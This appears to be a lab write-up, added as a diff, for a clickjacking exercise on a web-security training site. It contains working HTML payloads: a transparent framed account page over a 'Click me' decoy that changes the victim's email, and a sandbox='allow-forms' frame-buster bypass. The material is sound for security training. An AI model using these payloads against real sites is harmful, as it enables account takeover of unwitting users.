@@ -1,0 +1,79 @@
+Lab #3 - Clickjacking with a frame buster script
+
+Vulnerability - This lab is protected by a frame buster which prevents the website from being framed.
+
+Goal - craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
+
+Credentials - wiener:peter
+
+Analysis:
+- This website allow user to prefill form using parameters in URL
+=> we can use this to prefill form with our emails and fool user into updating their email address by clicking on a "Click me" decoy.
+- Craft an HTML file:
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            #target_website {
+                position: relative;
+                width: 700px;
+                height: 500px;
+                opacity: 0.01;
+                z-index: 2;
+
+            }
+
+            #decoy_website {
+                position: absolute;
+                top:480px;
+                left:60px;
+                z-index: 1;
+            }
+
+        </style>
+    </head>
+
+    <body>
+        <div id="decoy_website">
+            Click me
+        </div>
+        <iframe id="target_website" src="https://0a97005704b1607a8052177600bd0009.web-security-academy.net/my-account?email=evil@gmail.com"></iframe>
+    </body>
+</html>
+=> See an error: This page cannot be framed
+
+- using iframe sandbox attribute to bypass this protection => set sandbox="allow-forms"
+
+Solution:
+- craft an HTML file and upload to exploit server:
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            #target_website {
+                position: relative;
+                width: 700px;
+                height: 500px;
+                opacity: 0.01;
+                z-index: 2;
+
+            }
+
+            #decoy_website {
+                position: absolute;
+                top:470px;
+                left:60px;
+                z-index: 1;
+            }
+
+        </style>
+    </head>
+
+    <body>
+        <div id="decoy_website">
+            Click me
+        </div>
+        <iframe id="target_website" sandbox="allow-forms" src="https://0a97005704b1607a8052177600bd0009.web-security-academy.net/my-account?email=evil2@evil-email.com"></iframe>
+    </body>
+</html>
+
